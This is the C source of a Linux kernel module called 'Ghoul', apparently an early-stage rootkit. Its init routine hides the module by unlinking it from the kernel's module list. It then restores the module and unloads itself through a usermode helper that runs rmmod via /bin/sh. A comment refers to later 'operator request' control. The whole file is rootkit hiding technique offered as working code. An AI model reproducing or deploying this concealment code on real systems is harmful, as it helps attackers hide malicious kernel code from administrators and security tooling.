#include <linux/module.h>

static struct list_head *prev_module;

void hide_self(void)
{
    pr_info("Ghoul: hiding Self\n");
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void show_self(void)
{
    pr_info("Ghoul: showing self\n");
    list_add(&THIS_MODULE->list, prev_module);
}

void unload_self(void)
{
    // as kernel modules cannot unload themselves directly, a usermode helper is used
    char *argv[] = { "/bin/sh", "-c", "/sbin/rmmod ghoul", NULL };
    call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
}

static int __init ghoul_init(void)
{
    pr_info("Ghoul: inserted\n");
    hide_self();

    // show self and unload (this is temporary as later this will be done upon operator request)
    show_self();
    unload_self();
    return 0;
}

static void __exit ghoul_exit(void)
{
    pr_info("Ghoul: removed\n");
    return;
}

module_init(ghoul_init)
module_exit(ghoul_exit)
MODULE_LICENSE("GPL");